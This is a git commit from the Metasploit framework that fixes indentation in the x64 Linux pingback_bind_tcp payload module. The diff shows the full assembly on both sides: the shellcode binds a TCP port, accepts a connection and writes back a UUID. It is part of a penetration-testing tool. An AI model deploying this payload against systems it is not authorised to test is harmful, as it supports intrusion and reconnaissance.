3e765090e28e8b060390b5342e5b56452fda8576
bwatters-r7 <bwatters@rapid7.com>
2019-05-30 16:09:33 -0500

    Fix some spacing

--- modules/payloads/singles/linux/x64/pingback_bind_tcp.rb
+++ modules/payloads/singles/linux/x64/pingback_bind_tcp.rb
@@ -46,86 +46,82 @@ module MetasploitModule
       sleep_nanoseconds = (seconds % 1 * 1000000000).to_i
 
       asm = %Q^
-
-        push   #{retry_count}        ; retry counter
-        pop    r9
-        push   rsi
-        push   rax
-
-        ;SOCKET
-        push   0x29
-        pop    rax
-        cdq
-        push   0x2
-        pop    rdi
-        push   0x1
-        pop    rsi
-        syscall ; socket(PF_INET, SOCK_STREAM, IPPROTO_IP)
-        test   rax, rax
-        js failed
+          push   #{retry_count}        ; retry counter
+          pop    r9
+          push   rsi
+          push   rax
+         ;SOCKET
+          push   0x29
+          pop    rax
+          cdq
+          push   0x2
+          pop    rdi
+          push   0x1
+          pop    rsi
+          syscall ; socket(PF_INET, SOCK_STREAM, IPPROTO_IP)
+          test   rax, rax
+          js failed
 
         xchg   rdi, rax
-
-            mov    rcx, #{encoded_host_port}
-            push   rcx
-            mov    rsi, rsp
-            push   rsp
-            pop    rsi                          ; store pointer to struct
+          mov    rcx, #{encoded_host_port}
+          push   rcx
+          mov    rsi, rsp
+          push   rsp
+          pop    rsi                          ; store pointer to struct
 
         bind_call:
-            ; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
-            ; rdi -> fd already stored in rdi
-            ; rsi -> pointer to sockaddr_in6 struct already in rsi
-            push   0x31
-            pop    rax                          ; bind syscall
-            push   0x10                         ; sockaddr length
-            pop    rdx                          ; 
-            syscall
+          ; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
+          ; rdi -> fd already stored in rdi
+          ; rsi -> pointer to sockaddr_in6 struct already in rsi
+          push   0x31
+          pop    rax                          ; bind syscall
+          push   0x10                         ; sockaddr length
+          pop    rdx                          ; 
+          syscall
 
         listen_call:
-            ; int listen(int sockfd, int backlog);
-            ; rdi -> fd already stored in rdi
-            push   0x32
-            pop    rax                          ; listen syscall
-            push   0x1
-            pop    rsi                          ; backlog
-            syscall
+          ; int listen(int sockfd, int backlog);
+          ; rdi -> fd already stored in rdi
+          push   0x32
+          pop    rax                          ; listen syscall
+          push   0x1
+          pop    rsi                          ; backlog
+          syscall
 
         accept_call:
-            ; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
-            ; rdi -> fd already stored in rdi
-            push   0x2b
-            pop    rax                          ; accept syscall
-            cdq                                 ; zero-out rdx via sign-extension
-            push   rdx
-            push   rdx
-            push rsp
-            pop rsi                             ; when populated, client will be stored in rsi
-            push   0x1c
-            lea    rdx, [rsp]                   ; pointer to length of rsi (16)
-            syscall
-            
-            xchg    rdi, rax                    ; grab client fd
-      send_pingback:
-        ; sys_write(fd:rdi, buf*:rsi, length:rdx)
-        push #{uuid_as_db.split(",").length}  ; length of the PINGBACK UUID
-        pop rdx                               ; length in rdx
-        call get_uuid_address         ; put uuid buffer on the stack
-        db #{uuid_as_db}  ; PINGBACK_UUID
-      get_uuid_address:
-        pop rsi                       ; UUID address into rsi
-        xor rax, rax                  ; sys_write = offset 1
-        inc rax                       ; sys_write = offset 1
-        syscall                       ; call sys_write
+          ; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
+          ; rdi -> fd already stored in rdi
+          push   0x2b
+          pop    rax                          ; accept syscall
+          cdq                                 ; zero-out rdx via sign-extension
+          push   rdx
+          push   rdx
+          push rsp
+          pop rsi                             ; when populated, client will be stored in rsi
+          push   0x1c
+          lea    rdx, [rsp]                   ; pointer to length of rsi (16)
+          syscall
+          xchg    rdi, rax                    ; grab client fd
+        send_pingback:
+          ; sys_write(fd:rdi, buf*:rsi, length:rdx)
+          push #{uuid_as_db.split(",").length}  ; length of the PINGBACK UUID
+          pop rdx                               ; length in rdx
+          call get_uuid_address         ; put uuid buffer on the stack
+          db #{uuid_as_db}  ; PINGBACK_UUID
+        get_uuid_address:
+          pop rsi                       ; UUID address into rsi
+          xor rax, rax                  ; sys_write = offset 1
+          inc rax                       ; sys_write = offset 1
+          syscall                       ; call sys_write
 
-      failed:
-        push   0x3c
-        pop    rax
-        push   0x1
-        pop    rdi
-        syscall ; exit(1)
+        failed:
+          push   0x3c
+          pop    rax
+          push   0x1
+          pop    rdi
+          syscall ; exit(1)
 
-      ^
+        ^
       asm
     Metasm::Shellcode.assemble(Metasm::X64.new, asm).encode_string
 
